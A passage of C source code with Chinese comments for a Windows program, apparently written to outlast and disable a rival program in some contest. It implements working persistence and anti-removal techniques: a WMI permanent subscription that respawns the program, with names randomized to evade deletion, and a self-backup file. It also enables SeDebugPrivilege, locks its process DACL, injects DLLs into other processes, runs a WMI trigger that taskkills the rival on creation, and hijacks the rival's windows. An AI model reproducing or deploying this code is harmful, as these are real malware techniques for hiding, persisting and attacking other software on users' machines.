        _snwprintf(temp, _countof(temp), L"[%02d:%02d:%02d.%03d] %s\r\n",
                   st.wHour, st.wMinute, st.wSecond, st.wMilliseconds, szLine);
        temp[_countof(temp) - 1] = L'\0';

        /* 共享日志是跨进程无锁读写的：读到别人正在搬移的中间状态时必须有界求长，
           否则 wcslen 可能越过日志区跑到映射之外 */
        size_t len = XXLogLen(pLog, maxLen + 1);
        if (len > maxLen) { pLog[maxLen] = L'\0'; len = maxLen; }

        size_t newLen = wcslen(temp);
        if (len + newLen <= maxLen) {
            /* 第二参是缓冲区总容量（含结尾 NUL），不是剩余空间 */
            wcscat_s(pLog, maxLen + 1 - len, temp);
        } else {
            /* 丢掉最旧的一段，只保留最近 maxLen 个字符 */
            size_t drop = len + newLen - maxLen;
            if (drop < len) {
                memmove(pLog, pLog + drop, (len - drop) * sizeof(WCHAR));
                pLog[len - drop] = L'\0';
            } else {
                pLog[0] = L'\0';
            }
            wcscat_s(pLog, maxLen + 1 - wcslen(pLog), temp);
        }
    }

    LeaveCriticalSection(&g_csLog);
}

/* ================== WMI 永久订阅 ================== */
/* ================== 带会话 token 的 WMI 订阅名 ==================
   yy 是按**固定名**找我们的复活订阅的（它的字符串里就写着 `XX_RespawnFilter` /
   `XX_RespawnConsumer`），找到就删。给名字加上会话 token 之后它按名字搜不到；
   而复活出来的实例带着同一个 token（命令行 --token 继承），所以新实例仍然能认出、
   复用/重建同一条订阅 —— 既防定点删除，又不影响复活链。 */
static void BuildRespawnNames(WCHAR *filterName, SIZE_T cf, WCHAR *consumerName, SIZE_T cc)
{
    ULONGLONG tok = NameTok();
    swprintf_s(filterName, cf, L"XX_RespawnFilter_%016llX", (unsigned long long)tok);
    swprintf_s(consumerName, cc, L"XX_RespawnConsumer_%016llX", (unsigned long long)tok);
}
static BOOL SetupWMISubscription(void)
{
    HRESULT hr;
    IWbemLocator *pLocator = NULL;
    IWbemServices *pServices = NULL;
    IEnumWbemClassObject *pEnum = NULL;
    IWbemClassObject *pFilterClass = NULL;
    IWbemClassObject *pFilterInstance = NULL;
    IWbemClassObject *pConsumerClass = NULL;
    IWbemClassObject *pConsumerInstance = NULL;
    IWbemClassObject *pBindingClass = NULL;
    IWbemClassObject *pBindingInstance = NULL;
    VARIANT var;
    BOOL bRet = FALSE;
    WCHAR szExePath[MAX_PATH];
    WCHAR szQuery[512];
    WCHAR szCmdTemplate[1024];
    WCHAR szFilterName[64], szConsumerName[64];
    WCHAR szFilterRef[128], szConsumerRef[128];

    hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) {
        WriteLog(L"WMI: CoInitializeEx failed 0x%08X", hr);
        return FALSE;
    }

    hr = CoCreateInstance(&CLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER,
                          &IID_IWbemLocator, (void**)&pLocator);
    if (FAILED(hr) || !pLocator) {
        WriteLog(L"WMI: CoCreateInstance failed 0x%08X", hr);
        CoUninitialize();
        return FALSE;
    }

    /* 必须连 ROOT\SUBSCRIPTION：__EventFilter / __FilterToConsumerBinding 到处都有，
       但 CommandLineEventConsumer 只定义在 root\subscription。原来连的是 root\cimv2，
       于是消费类 GetObject 直接 WBEM_E_NOT_FOUND(0x80041002)，整个 WMI 复活订阅失效。
       过滤器里仍然用 EventNamespace=root\cimv2 去订阅 Win32_Process 事件。 */
    hr = pLocator->lpVtbl->ConnectServer(pLocator, L"ROOT\\SUBSCRIPTION", NULL, NULL,
                                          NULL, 0, NULL, NULL, &pServices);
    if (FAILED(hr) || !pServices) {
        WriteLog(L"WMI: ConnectServer failed 0x%08X", hr);
        pLocator->lpVtbl->Release(pLocator);
        CoUninitialize();
        return FALSE;
    }

    hr = CoSetProxyBlanket((IUnknown*)pServices, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE,
                           NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE,
                           NULL, EOAC_NONE);
    if (FAILED(hr)) {
        WriteLog(L"WMI: CoSetProxyBlanket failed 0x%08X", hr);
        goto cleanup;
    }

    if (!GetModuleFileNameW(NULL, szExePath, MAX_PATH)) {
        WriteLog(L"WMI: GetModuleFileName failed");
        goto cleanup;
    }

    swprintf_s(szQuery, _countof(szQuery),
               L"SELECT * FROM __InstanceDeletionEvent WITHIN 1 "
               L"WHERE TargetInstance ISA 'Win32_Process' "
               L"AND TargetInstance.Name = 'xx.exe'");
    BuildRespawnNames(szFilterName, _countof(szFilterName),
                     szConsumerName, _countof(szConsumerName));
    swprintf_s(szFilterRef, _countof(szFilterRef), L"__EventFilter.Name=\"%ls\"", szFilterName);
    swprintf_s(szConsumerRef, _countof(szConsumerRef), L"CommandLineEventConsumer.Name=\"%ls\"", szConsumerName);
    WriteLog(L"WMI: 订阅名已带会话 token（不落日志）");

    swprintf_s(szCmdTemplate, _countof(szCmdTemplate),
               L"cmd.exe /c start \"\" \"%s\"", szExePath);

    /* 创建 __EventFilter */
    hr = pServices->lpVtbl->GetObject(pServices, L"__EventFilter", 0, NULL, &pFilterClass, NULL);
    if (FAILED(hr) || !pFilterClass) {
        WriteLog(L"WMI: GetObject Filter class failed 0x%08X", hr);
        goto cleanup;
    }

    hr = pFilterClass->lpVtbl->SpawnInstance(pFilterClass, 0, &pFilterInstance);
    if (FAILED(hr) || !pFilterInstance) {
        WriteLog(L"WMI: SpawnInstance Filter failed 0x%08X", hr);
        goto cleanup;
    }

    VariantInit(&var);
    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(szFilterName);
    hr = pFilterInstance->lpVtbl->Put(pFilterInstance, L"Name", 0, &var, CIM_FLAG_ANY);
    VariantClear(&var);

    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(L"WQL");
    hr = pFilterInstance->lpVtbl->Put(pFilterInstance, L"QueryLanguage", 0, &var, CIM_FLAG_ANY);
    VariantClear(&var);

    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(L"root\\cimv2");
    hr = pFilterInstance->lpVtbl->Put(pFilterInstance, L"EventNamespace", 0, &var, CIM_FLAG_ANY);
    VariantClear(&var);

    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(szQuery);
    hr = pFilterInstance->lpVtbl->Put(pFilterInstance, L"Query", 0, &var, CIM_FLAG_ANY);
    VariantClear(&var);

    var.vt = VT_I4;
    var.lVal = 0;
    pFilterInstance->lpVtbl->Put(pFilterInstance, L"Executability", 0, &var, CIM_FLAG_ANY);

    hr = pServices->lpVtbl->PutInstance(pServices, pFilterInstance, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
    if (FAILED(hr)) {
        WriteLog(L"WMI: PutInstance Filter failed 0x%08X", hr);
        goto cleanup;
    }

    /* 创建 CommandLineEventConsumer */
    hr = pServices->lpVtbl->GetObject(pServices, L"CommandLineEventConsumer", 0, NULL, &pConsumerClass, NULL);
    if (FAILED(hr) || !pConsumerClass) {
        WriteLog(L"WMI: GetObject Consumer class failed 0x%08X", hr);
        goto cleanup;
    }

    hr = pConsumerClass->lpVtbl->SpawnInstance(pConsumerClass, 0, &pConsumerInstance);
    if (FAILED(hr) || !pConsumerInstance) {
        WriteLog(L"WMI: SpawnInstance Consumer failed 0x%08X", hr);
        goto cleanup;
    }

    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(szConsumerName);
    pConsumerInstance->lpVtbl->Put(pConsumerInstance, L"Name", 0, &var, CIM_FLAG_ANY);
    VariantClear(&var);

    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(szCmdTemplate);
    pConsumerInstance->lpVtbl->Put(pConsumerInstance, L"CommandLineTemplate", 0, &var, CIM_FLAG_ANY);
    VariantClear(&var);

    /* KillTimeout 是 uint32（秒），不是 bool */
    var.vt = VT_I4;
    var.lVal = 60;
    pConsumerInstance->lpVtbl->Put(pConsumerInstance, L"KillTimeout", 0, &var, CIM_FLAG_ANY);

    var.vt = VT_BOOL;
    var.boolVal = VARIANT_TRUE;
    pConsumerInstance->lpVtbl->Put(pConsumerInstance, L"RunInteractively", 0, &var, CIM_FLAG_ANY);
    VariantClear(&var);

    hr = pServices->lpVtbl->PutInstance(pServices, pConsumerInstance, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
    if (FAILED(hr)) {
        WriteLog(L"WMI: PutInstance Consumer failed 0x%08X", hr);
        goto cleanup;
    }

    /* 绑定 */
    hr = pServices->lpVtbl->GetObject(pServices, L"__FilterToConsumerBinding", 0, NULL, &pBindingClass, NULL);
    if (FAILED(hr) || !pBindingClass) {
        WriteLog(L"WMI: GetObject Binding class failed 0x%08X", hr);
        goto cleanup;
    }

    hr = pBindingClass->lpVtbl->SpawnInstance(pBindingClass, 0, &pBindingInstance);
    if (FAILED(hr) || !pBindingInstance) {
        WriteLog(L"WMI: SpawnInstance Binding failed 0x%08X", hr);
        goto cleanup;
    }

    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(szFilterRef);
    pBindingInstance->lpVtbl->Put(pBindingInstance, L"Filter", 0, &var, CIM_FLAG_ANY);
    VariantClear(&var);

    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(szConsumerRef);
    pBindingInstance->lpVtbl->Put(pBindingInstance, L"Consumer", 0, &var, CIM_FLAG_ANY);
    VariantClear(&var);

    var.vt = VT_BOOL;
    var.boolVal = VARIANT_FALSE;
    pBindingInstance->lpVtbl->Put(pBindingInstance, L"MaintainPSProvOrder", 0, &var, CIM_FLAG_ANY);
    VariantClear(&var);

    hr = pServices->lpVtbl->PutInstance(pServices, pBindingInstance, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
    if (FAILED(hr)) {
        WriteLog(L"WMI: Binding failed 0x%08X", hr);
        goto cleanup;
    }

    WriteLog(L"WMI subscription created");
    bRet = TRUE;

    /* ================== #15 反向监听：yy.exe 一被创建就抢先清理 ==================
       yybad.md P1 #15。用同一套 WMI（还能省下自己的轮询延迟）：
         __EventFilter "XX_YyWatchFilter" 订阅 Win32_Process 的**创建**事件；
         CommandLineEventConsumer "XX_YyWatchConsumer" 执行 taskkill。
       yy 的复活链一旦把它拉起来，1 秒内就会被按掉；再叠加 atkcore 30ms 的轮询与
       我们已经删掉的对手 WMI 三件套，它想稳定活过 8 秒几乎不可能。
       注意：这两个对象用 XX_ 前缀，不会被我们自己的 RemoveEnemyWmi（删 YY_ 前缀）误删。 */
    {
        IWbemClassObject *pYyFilter = NULL, *pYyConsumer = NULL, *pYyBind = NULL;
        WCHAR szSysDir[MAX_PATH] = L"", szCmd[1024] = L"", szYyQuery[512] = L"";
        UINT nSysLen = GetSystemDirectoryW(szSysDir, MAX_PATH);

        if (nSysLen > 0 && nSysLen < MAX_PATH) {
            swprintf_s(szCmd, _countof(szCmd),
                       L"\"%s\\cmd.exe\" /c taskkill /f /im yy.exe & taskkill /f /im ww.exe",
                       szSysDir);
            swprintf_s(szYyQuery, _countof(szYyQuery),
                       L"SELECT * FROM __InstanceCreationEvent WITHIN 1 "
                       L"WHERE TargetInstance ISA 'Win32_Process' "
                       L"AND TargetInstance.Name = 'yy.exe'");

            do {   /* 用 do/while(FALSE) 当局部错误出口，失败不影响上面的复活订阅 */
                hr = pServices->lpVtbl->GetObject(pServices, L"__EventFilter", 0, NULL, &pFilterClass, NULL);
                if (FAILED(hr) || !pFilterClass) { WriteLog(L"WMI(yywatch): filter class 0x%08X", hr); break; }
                hr = pFilterClass->lpVtbl->SpawnInstance(pFilterClass, 0, &pYyFilter);
                if (FAILED(hr) || !pYyFilter) { WriteLog(L"WMI(yywatch): spawn filter 0x%08X", hr); break; }
                var.vt = VT_BSTR; var.bstrVal = SysAllocString(L"XX_YyWatchFilter");
                pYyFilter->lpVtbl->Put(pYyFilter, L"Name", 0, &var, CIM_FLAG_ANY); VariantClear(&var);
                var.vt = VT_BSTR; var.bstrVal = SysAllocString(L"WQL");
                pYyFilter->lpVtbl->Put(pYyFilter, L"QueryLanguage", 0, &var, CIM_FLAG_ANY); VariantClear(&var);
                var.vt = VT_BSTR; var.bstrVal = SysAllocString(L"root\\cimv2");
                pYyFilter->lpVtbl->Put(pYyFilter, L"EventNamespace", 0, &var, CIM_FLAG_ANY); VariantClear(&var);
                var.vt = VT_BSTR; var.bstrVal = SysAllocString(szYyQuery);
                pYyFilter->lpVtbl->Put(pYyFilter, L"Query", 0, &var, CIM_FLAG_ANY); VariantClear(&var);
                var.vt = VT_I4; var.lVal = 0;
                pYyFilter->lpVtbl->Put(pYyFilter, L"Executability", 0, &var, CIM_FLAG_ANY);
                hr = pServices->lpVtbl->PutInstance(pServices, pYyFilter, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
                if (FAILED(hr)) { WriteLog(L"WMI(yywatch): put filter 0x%08X", hr); break; }

                hr = pServices->lpVtbl->GetObject(pServices, L"CommandLineEventConsumer", 0, NULL, &pConsumerClass, NULL);
                if (FAILED(hr) || !pConsumerClass) { WriteLog(L"WMI(yywatch): consumer class 0x%08X", hr); break; }
                hr = pConsumerClass->lpVtbl->SpawnInstance(pConsumerClass, 0, &pYyConsumer);
                if (FAILED(hr) || !pYyConsumer) { WriteLog(L"WMI(yywatch): spawn consumer 0x%08X", hr); break; }
                var.vt = VT_BSTR; var.bstrVal = SysAllocString(L"XX_YyWatchConsumer");
                pYyConsumer->lpVtbl->Put(pYyConsumer, L"Name", 0, &var, CIM_FLAG_ANY); VariantClear(&var);
                var.vt = VT_BSTR; var.bstrVal = SysAllocString(szCmd);
                pYyConsumer->lpVtbl->Put(pYyConsumer, L"CommandLineTemplate", 0, &var, CIM_FLAG_ANY); VariantClear(&var);
                var.vt = VT_I4; var.lVal = 30;
                pYyConsumer->lpVtbl->Put(pYyConsumer, L"KillTimeout", 0, &var, CIM_FLAG_ANY);
                var.vt = VT_BOOL; var.boolVal = VARIANT_TRUE;
                pYyConsumer->lpVtbl->Put(pYyConsumer, L"RunInteractively", 0, &var, CIM_FLAG_ANY); VariantClear(&var);
                hr = pServices->lpVtbl->PutInstance(pServices, pYyConsumer, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
                if (FAILED(hr)) { WriteLog(L"WMI(yywatch): put consumer 0x%08X", hr); break; }

                hr = pServices->lpVtbl->GetObject(pServices, L"__FilterToConsumerBinding", 0, NULL, &pBindingClass, NULL);
                if (FAILED(hr) || !pBindingClass) { WriteLog(L"WMI(yywatch): binding class 0x%08X", hr); break; }
                hr = pBindingClass->lpVtbl->SpawnInstance(pBindingClass, 0, &pYyBind);
                if (FAILED(hr) || !pYyBind) { WriteLog(L"WMI(yywatch): spawn binding 0x%08X", hr); break; }
                var.vt = VT_BSTR; var.bstrVal = SysAllocString(L"__EventFilter.Name=\"XX_YyWatchFilter\"");
                pYyBind->lpVtbl->Put(pYyBind, L"Filter", 0, &var, CIM_FLAG_ANY); VariantClear(&var);
                var.vt = VT_BSTR; var.bstrVal = SysAllocString(L"CommandLineEventConsumer.Name=\"XX_YyWatchConsumer\"");
                pYyBind->lpVtbl->Put(pYyBind, L"Consumer", 0, &var, CIM_FLAG_ANY); VariantClear(&var);
                hr = pServices->lpVtbl->PutInstance(pServices, pYyBind, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
                if (FAILED(hr)) { WriteLog(L"WMI(yywatch): put binding 0x%08X", hr); break; }
                WriteLog(L"WMI(yywatch) created: yy.exe 一创建就被 taskkill");
            } while (0);

            if (pYyBind) pYyBind->lpVtbl->Release(pYyBind);
            if (pYyFilter) pYyFilter->lpVtbl->Release(pYyFilter);
            if (pYyConsumer) pYyConsumer->lpVtbl->Release(pYyConsumer);
        }
    }

cleanup:
    if (pBindingInstance) pBindingInstance->lpVtbl->Release(pBindingInstance);
    if (pBindingClass) pBindingClass->lpVtbl->Release(pBindingClass);
    if (pConsumerInstance) pConsumerInstance->lpVtbl->Release(pConsumerInstance);
    if (pConsumerClass) pConsumerClass->lpVtbl->Release(pConsumerClass);
    if (pFilterInstance) pFilterInstance->lpVtbl->Release(pFilterInstance);
    if (pFilterClass) pFilterClass->lpVtbl->Release(pFilterClass);
    if (pEnum) pEnum->lpVtbl->Release(pEnum);
    if (pServices) pServices->lpVtbl->Release(pServices);
    if (pLocator) pLocator->lpVtbl->Release(pLocator);
    CoUninitialize();
    return bRet;
}

/* ================== 自保：持续维护 xx.exe 备份 ==================
   对手会结束 xx.exe 并删除磁盘文件；这里持续维护 <dir>\xxres.bin，
   复活方(svcguard.dll / window.dll)在 xx.exe 缺失时用它还原。 */
#define XX_BACKUP_NAME XX_BACKUP_NAME_W

static void GetSelfDir(WCHAR *dir, SIZE_T cch)
{
    GetModuleFileNameW(NULL, dir, (DWORD)cch);
    WCHAR *p = wcsrchr(dir, L'\\');
    if (p) p[1] = L'\0';
}

static DWORD WINAPI SelfProtectThread(LPVOID lpParam)
{
    UNREFERENCED_PARAMETER(lpParam);
    WCHAR dir[MAX_PATH], self[MAX_PATH], bak[MAX_PATH];
    GetSelfDir(dir, MAX_PATH);
    swprintf_s(bak, MAX_PATH, L"%s" XX_BACKUP_NAME, dir);
    for (;;) {
        if (GetFileAttributesW(bak) == INVALID_FILE_ATTRIBUTES) {
            GetModuleFileNameW(NULL, self, MAX_PATH);
            if (CopyFileW(self, bak, FALSE))
                WriteLog(L"self backup written: %s", bak);
        }
        Sleep(1000);
    }
    return 0;
}

/* ================== 调试特权（新约定允许 SeDebugPrivilege） ==================
   跨进程打开句柄做注入/击杀时标准用户权限不够，尤其跨会话与系统进程。 */
static BOOL EnableDebugPrivilege(void)
{
    HANDLE hToken = NULL;
    TOKEN_PRIVILEGES tp;
    BOOL ok = FALSE;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (LookupPrivilegeValueW(NULL, L"SeDebugPrivilege", &tp.Privileges[0].Luid)) {
        SetLastError(ERROR_SUCCESS);
        if (AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL) &&
            GetLastError() != ERROR_NOT_ALL_ASSIGNED)
            ok = TRUE;
    }
    CloseHandle(hToken);
    return ok;
}

/* ================== deferred init + DLL load thread ================== */
static DWORD WINAPI InitThread(LPVOID lpParam)
{
    UNREFERENCED_PARAMETER(lpParam);

    if (!EnableDebugPrivilege())
        WriteLog(L"SeDebugPrivilege enable failed: %lu", GetLastError());
    else
        WriteLog(L"SeDebugPrivilege enabled");

    /* 必须在收紧 DACL 之前打开自己的进程句柄：之后 xx 的 DACL 把 Everyone
       全拒，连自己都打不开。该句柄随后写进共享内存，由 svcguard 复制给宿主
       里的 guard.dll（见 xxipc.h 的 OFFSET_SELF_HANDLE）。 */
    g_hSelfHandle = OpenProcess(XX_SHARED_HANDLE_ACCESS, FALSE, GetCurrentProcessId());
    WriteLog(L"self handle: %s", g_hSelfHandle ? L"OK" : L"failed");

    /* 会话号也必须在收紧 DACL 之前取：ProcessIdToSessionId 内部要打开自身进程，
       DACL 一锁（又没有 SeDebugPrivilege 绕过）就会失败并返回 0 —— 之前日志里
       那句 "session id: 0" 就是这么来的，XX_SESSION 于是永远没写进去。 */
    if (!ProcessIdToSessionId(GetCurrentProcessId(), &g_dwOwnSession))
        g_dwOwnSession = 0;
    WriteLog(L"own session: %lu", g_dwOwnSession);

    if (!InitSecurityDescriptor())
        WriteLog(L"Security descriptor failed");
    else
        WriteLog(L"Security descriptor OK");

    if (!InitSharedMemory()) {
        /* 建不出映射（例如没有 SeCreateGlobalPrivilege）也继续跑下去：
           至少把 window.dll 拉起来抢弹窗锁，不要在这里整体放弃。 */
        WriteLog(L"Shared memory failed, continue without IPC");
    } else {
        WriteLog(L"Shared memory OK");
        XX_SELF_HANDLE(g_pSharedView) = (ULONGLONG)(ULONG_PTR)g_hSelfHandle;
        XX_SESSION(g_pSharedView) = (LONG)g_dwOwnSession;
        {
            /* ① 自身全路径：注入的 dll 是从 %TEMP% 的改名副本加载的，必须靠这个
                  字段才能找到真正的程序目录（xx.exe/xxres.bin/同伴 dll/xpt.xpt）。
               ② 共享 salt：映射**已经存在**（还有别的实例活着）就沿用旧值，不能重新随机 ——
                  否则各实例算出的临时副本名/回退锁名会不一致。
               ③ 会话随机名 token：**不写共享内存**，只在注入/加载时用 XxSetNames 推给各模块
                  （方案 A：远程调用，读完由注入方清零释放）。 */
            WCHAR self[MAX_PATH] = L"";
            if (GetModuleFileNameW(NULL, self, MAX_PATH)) {
                if (wcslen(self) < XX_PATH_MAX) {
                    wcsncpy_s(XX_XXPATH(g_pSharedView), XX_PATH_MAX, self, _TRUNCATE);
                    WriteLog(L"xx path: %s", self);
                } else {
                    /* 放不下就宁可不写：写进去的截断路径会让注入副本推错目录，
                       留空各模块会退回自己的模块路径（至少 xx.exe 本体是对的）。 */
                    XX_XXPATH(g_pSharedView)[0] = L'\0';
                    WriteLog(L"xx path 太长（%u 字符 > %d），不写入共享内存", (unsigned)wcslen(self), XX_PATH_MAX - 1);
                }
            }
            if (g_bFreshMapping || XX_TMP_SALT(g_pSharedView) == 0) {
                srand(GetTickCount() ^ (GetCurrentProcessId() << 4));
                XX_TMP_SALT(g_pSharedView) = (((DWORD)rand() << 16) ^ (DWORD)rand()) | 1u;
                WriteLog(L"shared salt: NEW（值不落日志：共享内存里本来就有，日志不该再多一份副本）");
            } else {
                WriteLog(L"shared salt: REUSE（沿用旧值）");
            }
            /* 共享内存里的 64 位**回退** token：映射已存在就沿用（xx 重启不换名），
               否则用 RtlGenRandom 新生成。它是"拿不到秘密 token 的实例"之间的共同值，
               所以可被能解析我们映射的对手读到 —— 真正的秘密 token 在下面、不写共享内存。 */
            if (g_bFreshMapping || XX_NAME_TOKEN64(g_pSharedView) == 0) {
                XX_NAME_TOKEN64(g_pSharedView) = MakeNameToken();
                WriteLog(L"fallback token64: NEW（不落日志）");
            } else {
                WriteLog(L"fallback token64: REUSE（沿用旧值）");
            }
            /* 真正的秘密 token：64 位、RtlGenRandom 生成、**不写共享内存**，
               只经 XxSetNames 推给各模块（参数块读完清零）。 */
            if (g_dwInheritedToken) {
                g_dwNameToken = g_dwInheritedToken;      /* 沿用上一轮 token：接着上一轮继续工作 */
                WriteLog(L"name token: **继承上一轮**（值不落任何日志/文件/共享内存）");
            } else {
                g_dwNameToken = MakeNameToken();
                WriteLog(L"name token: 64-bit generated（全新会话，值不落日志）");
            }
            WriteLog(L"name token: 64-bit generated（值不落任何日志/文件/共享内存）");
        }
    }

    if (!CreateHeartbeatSuffix()) {
        WriteLog(L"Heartbeat suffix failed, continue");
    } else {
        WriteLog(L"Heartbeat suffix: %s", g_szHeartbeatSuffix);
    }

    SpawnReviver();      /* 布置"只复活"的副本：本体一死它把 xx 拉回来（带 token） */

    WriteLog(L"Loading svcguard.dll...");
    WCHAR modPath[MAX_PATH] = L"";
    HMODULE hDeamon = LoadOurModuleEx(L"svcguard.dll", modPath, MAX_PATH);
    PushNamesToModule(hDeamon);   /* 方案 A：把会话随机名推给 svcguard */
    if (hDeamon) {
        WriteLog(L"svcguard.dll loaded: %ls", modPath);
        typedef void (WINAPI *DeamonInit_t)(void);
        DeamonInit_t pInit = (DeamonInit_t)XXGetProcByName(hDeamon, "DeamonInit");
        if (pInit) {
            pInit();
            WriteLog(L"DeamonInit called");
        } else {
            WriteLog(L"!! DeamonInit 导出不存在（%ls 是旧 dll）", modPath);
        }
    } else {
        WriteLog(L"svcguard.dll 加载失败（没有通过版本校验的那一份）");
    }

    /* window.dll 必须在慢速初始化（WMI 订阅）之前加载：
       弹窗出现得越早、抢到 Local\xx_wg_<token> 越早，8 秒红线越安全。 */
    WriteLog(L"Loading window.dll...");
    modPath[0] = L'\0';
    HMODULE hWin = LoadOurModuleEx(L"window.dll", modPath, MAX_PATH);
    PushNamesToModule(hWin);
    if (hWin) {
        WriteLog(L"window.dll loaded: %ls", modPath);
    } else {
        WriteLog(L"window.dll 加载失败（没有通过版本校验的那一份）");
    }

    RegisterSelfToXpt();

    /* guard.dll 不再由 xx.exe 加载：xx 被结束时它会一起死，无法完成"复活 xx"。
       改由 svcguard.dll 注入宿主进程，并把 xx 自己的进程句柄一并复制进去
       （共享内存登记），从而绕开 xx 的进程 DACL。 */
    WriteLog(L"guard.dll: 交由 svcguard 注入宿主进程（不在 xx 内加载）");

    SetupWMISubscription();

    /* defense.dll：动态导入 StartDefense，在新线程运行（避免 Hook 影响 xx 主流程） */
    WriteLog(L"Loading defense.dll...");
    modPath[0] = L'\0';
    HMODULE hDef = LoadOurModuleEx(L"defense.dll", modPath, MAX_PATH);
    PushNamesToModule(hDef);
    if (hDef) {
        typedef void (WINAPI *StartDefense_t)(void);
        StartDefense_t pDef = (StartDefense_t)XXGetProcByName(hDef, "StartDefense");
        if (pDef) {
            HANDLE hDefThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pDef, NULL, 0, NULL);
            if (hDefThread) CloseHandle(hDefThread);
            WriteLog(L"defense.dll StartDefense started: %ls", modPath);
        } else {
            WriteLog(L"!! defense StartDefense 导出不存在（%ls 是旧 dll）", modPath);
        }
    } else {
        WriteLog(L"defense.dll 加载失败（没有通过版本校验的那一份）");
    }

    return 0;
}

/* ================== 对 yy 窗口的利用（依据 yybad.md 第一章，DDoS 项不做） ==================
   1.1 WM_DESTROY/DestroyWindow：yy 的 WndProc 里 `if (msg==WM_DESTROY) return 0;` 是白写，
       但**跨进程 DestroyWindow 也必然失败**（只有创建窗口的那个线程能销毁它），
       所以真正让它"消失"的是 1.3 + 1.5：隐藏 + 挂到不可见父窗口。
       yy 主循环只查 `!g_hMainWnd || !IsWindow(g_hMainWnd)`，隐藏后窗口依然"存在"
       → 它永远不会重建 → 8 秒后判负。这里仍尝试一次 DestroyWindow 并把结果写日志。
   1.2 WM_SETTEXT 未被拦截 → 走系统消息编组把标题改成我方窗口名（跨进程安全）。
   1.3 SetParent 到我们自己建的不可见窗口 → 即使 yy 自己再 ShowWindow 也看不见。
   1.5 其它未处理消息：SC_MINIMIZE / WM_ENABLE(FALSE)。
   1.6 日志框是标准 EDIT：用 WM_GETTEXT + WM_SETTEXT 追加嘲讽 / 整段清空。
       注意**不能用 EM_REPLACESEL**：它带字符串指针，跨进程不会被编组，目标会读到野指针
       （yybad.md 里那段代码是错的，会直接把 yy 搞崩或读到乱码）；WM_SETTEXT / WM_GETTEXT
       是窗口管理器会代为编组的消息，才是跨进程唯一安全的写法。 */
/* 这个窗口是不是**我们自己**的弹窗？
   注意绝不能用"该进程里有没有我们的 window 模块"来判断 —— 我们会把 window.dll
   注入进 yy 的子进程（蜜罐 lenovo_fix.exe 之类），那样它的窗口会被误判成我方窗口
   直接跳过，结果它的标题一直没人动（实测就是这么漏的）。
   可靠的判据只有两条：① 类名符合我方格式 `wnd_<16 位十六进制>`；
   ② 共享内存的弹窗持有者表里登记的正是这个句柄。 */
static BOOL __attribute__((unused)) GetProcessPathByPid(DWORD pid, WCHAR *path, DWORD cch)
{
    HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    DWORD n = cch;
    BOOL ok = FALSE;
    if (h) {
        ok = QueryFullProcessImageNameW(h, 0, path, &n) ? TRUE : FALSE;
        CloseHandle(h);
    }
    if (!ok && cch) path[0] = L'\0';
    return ok;
}
static BOOL IsOurPopupClass(const WCHAR *cls)
{
    int i;
    if (!cls) return FALSE;
    if (wcsncmp(cls, L"wnd_", 4) != 0) return FALSE;
    if (wcslen(cls) != 20) return FALSE;
    for (i = 4; i < 20; i++) {
        WCHAR c = cls[i];
        if (!((c >= L'0' && c <= L'9') || (c >= L'a' && c <= L'f'))) return FALSE;
    }
    return TRUE;
}

static BOOL IsOurOwnPopupWindow(HWND hWnd, const WCHAR *cls)
{
    HANDLE hMap;
    PVOID view;
    int i;

    if (IsOurPopupClass(cls)) return TRUE;

    hMap = XXOpenShared();
    if (!hMap) return FALSE;
    view = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, SHARED_MEM_SIZE);
    if (!view) { CloseHandle(hMap); return FALSE; }
    for (i = 0; i < OWNER_SLOTS; i++) {
        if ((HWND)(ULONG_PTR)XX_SLOT_HWND(view, i) == hWnd) {
            UnmapViewOfFile(view);
            CloseHandle(hMap);
            return TRUE;
        }
    }
    UnmapViewOfFile(view);
    CloseHandle(hMap);
    return FALSE;
}

/* ================== 攻击线程：窗口只用来"发现"，杀由 atkcore 统一做 ================== */
typedef void (WINAPI *XxKillTree_t)(DWORD pid);
static XxKillTree_t g_pfnKillTree = NULL;

/* 懒加载 atkcore 的 XxKillTree（按名扫描线程可能先于 AttackThread 跑起来） */
static XxKillTree_t EnsureKillTreeFn(void)
{
    if (!g_pfnKillTree) {
        HMODULE h = GetModuleHandleW(L"atkcore.dll");
        if (!h) {
            WCHAR p[MAX_PATH] = L"";
            h = LoadOurModuleEx(L"atkcore.dll", p, MAX_PATH);
            PushNamesToModule(h);
        }
        if (h) g_pfnKillTree = (XxKillTree_t)XXGetProcByName(h, "XxKillTree");
    }
    return g_pfnKillTree;
}

/* ================== 攻击线程 #2：**按进程名**扫描（与窗口扫描并行） ==================
   用户要求两条线分开跑：
     · AttackThread     —— 枚举窗口找 yy（能抓到"改了名但窗口特征还在"的副本）；
     · ProcScanThread   —— 直接扫进程表按名字找（yy.exe / ww.exe / lenovo_fix.exe），
                           不依赖窗口（无窗口/无桌面的副本也能杀）。
   两条线都走同一个 atkcore 出口（XxKillTree → 快杀 + 后台清理），互不干扰；
   频率 40ms（<50ms），发现即杀。 */
static DWORD WINAPI ProcScanThread(LPVOID lpParam)
{
